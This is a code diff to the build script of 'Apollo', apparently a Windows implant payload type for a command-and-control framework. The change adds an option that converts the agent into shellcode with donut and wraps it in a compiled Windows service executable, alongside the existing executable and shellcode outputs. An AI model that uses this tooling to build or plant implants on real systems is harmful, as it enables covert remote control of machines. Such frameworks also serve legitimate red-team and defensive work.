@@ -21,7 +21,7 @@ class Apollo(PayloadType):
     supported_os = [
         SupportedOS.Windows
     ]
-    version = "2.2.15"
+    version = "2.2.16"
     wrapper = False
     wrapped_payloads = ["scarecrow_wrapper", "service_wrapper"]
     note = """
@@ -32,9 +32,9 @@ A fully featured .NET 4.0 compatible training agent. Version: {}
         BuildParameter(
             name="output_type",
             parameter_type=BuildParameterType.ChooseOne,
-            choices=["WinExe", "Shellcode"],
+            choices=["WinExe", "Shellcode", "Service"],
             default_value="WinExe",
-            description="Output as shellcode, executable, or dynamically loaded library.",
+            description="Output as shellcode, executable, or service.",
         )
     ]
     c2_profiles = ["http", "smb", "tcp", "websocket"]
@@ -43,8 +43,9 @@ A fully featured .NET 4.0 compatible training agent. Version: {}
     agent_icon_path = agent_path / "agent_functions" / "apollo.svg"
     build_steps = [
         BuildStep(step_name="Gathering Files", step_description="Copying files to temp location"),
-        BuildStep(step_name="Compiling", step_description="Compiling with nuget and msbuild"),
+        BuildStep(step_name="Compiling", step_description="Compiling with nuget and dotnet"),
         BuildStep(step_name="Donut", step_description="Converting to Shellcode"),
+        BuildStep(step_name="Creating Service", step_description="Creating Service EXE from Shellcode")
     ]
 
     async def build(self) -> BuildResponse:
@@ -164,7 +165,7 @@ A fully featured .NET 4.0 compatible training agent. Version: {}
                 shutil.move("{}/Release/ExecutePE.exe".format(agent_build_path.name), targetExecutePEPath)
                 shutil.move("{}/Release/ApolloInterop.dll".format(agent_build_path.name), targetInteropPath)
                 shutil.move("{}/Release/RunOF.dll".format(agent_build_path.name), targetRunOfPath)
-                if self.get_parameter('output_type') != "Shellcode":
+                if self.get_parameter('output_type') == "WinExe":
                     await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
                         StepName="Donut",
@@ -184,7 +185,7 @@ A fully featured .NET 4.0 compatible training agent. Version: {}
                                                                  stderr=asyncio.subprocess.PIPE)
                     stdout, stderr = await proc.communicate()
 
-                    command = "{} -i {}".format(donutPath, output_path)
+                    command = "{} -x3 -k2 -i {}".format(donutPath, output_path)
                     # need to go through one more step to turn our exe into shellcode
                     proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
                                                                  stderr=asyncio.subprocess.PIPE,
@@ -212,10 +213,64 @@ A fully featured .NET 4.0 compatible training agent. Version: {}
                             StepStdout=f"Successfully passed through donut:\n{command}",
                             StepSuccess=True
                         ))
-                        resp.payload = open(shellcode_path, 'rb').read()
-                        resp.build_message = success_message
-                        resp.status = BuildStatus.Success
-                        resp.build_stdout = stdout_err
+                        if self.get_parameter('output_type') == "Shellcode":
+                            resp.payload = open(shellcode_path, 'rb').read()
+                            resp.build_message = success_message
+                            resp.status = BuildStatus.Success
+                            resp.build_stdout = stdout_err
+                        else:
+                            # we're generating a service executable
+                            working_path = (
+                                pathlib.PurePath(agent_build_path.name)
+                                / "Service"
+                                / "WindowsService1"
+                                / "Resources"
+                                / "loader.bin"
+                            )
+                            shutil.move(shellcode_path, working_path)
+                            command = f"dotnet build -c release -p:OutputType=WinExe -p:Platform=\"Any CPU\""
+                            proc = await asyncio.create_subprocess_shell(
+                                command,
+                                stdout=asyncio.subprocess.PIPE,
+                                stderr=asyncio.subprocess.PIPE,
+                                cwd=pathlib.PurePath(agent_build_path.name) / "Service",
+                            )
+                            stdout, stderr = await proc.communicate()
+                            if stdout:
+                                stdout_err += f"[stdout]\n{stdout.decode()}"
+                            if stderr:
+                                stdout_err += f"[stderr]\n{stderr.decode()}"
+                            output_path = (
+                                pathlib.PurePath(agent_build_path.name)
+                                / "Service"
+                                / "WindowsService1"
+                                / "bin"
+                                / "Release"
+                                / "net451"
+                                / "WindowsService1.exe"
+                            )
+                            output_path = str(output_path)
+                            if os.path.exists(output_path):
+                                resp.payload = open(output_path, "rb").read()
+                                resp.status = BuildStatus.Success
+                                resp.build_message = "New Service Executable created!"
+                                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                                    PayloadUUID=self.uuid,
+                                    StepName="Creating Service",
+                                    StepStdout=stdout_err,
+                                    StepSuccess=True
+                                ))
+                            else:
+                                resp.payload = b""
+                                resp.status = BuildStatus.Error
+                                resp.build_stderr = stdout_err + "\n" + output_path
+                                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                                    PayloadUUID=self.uuid,
+                                    StepName="Creating Service",
+                                    StepStdout=stdout_err,
+                                    StepSuccess=False
+                                ))
+
             else:
                 # something went wrong, return our errors
                 await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
@@ -232,6 +287,7 @@ A fully featured .NET 4.0 compatible training agent. Version: {}
             resp.payload = b""
             resp.status = BuildStatus.Error
             resp.build_message = "Error building payload: " + str(traceback.format_exc())
+        #await asyncio.sleep(10000)
         return resp
 
     async def check_if_callbacks_alive(self,
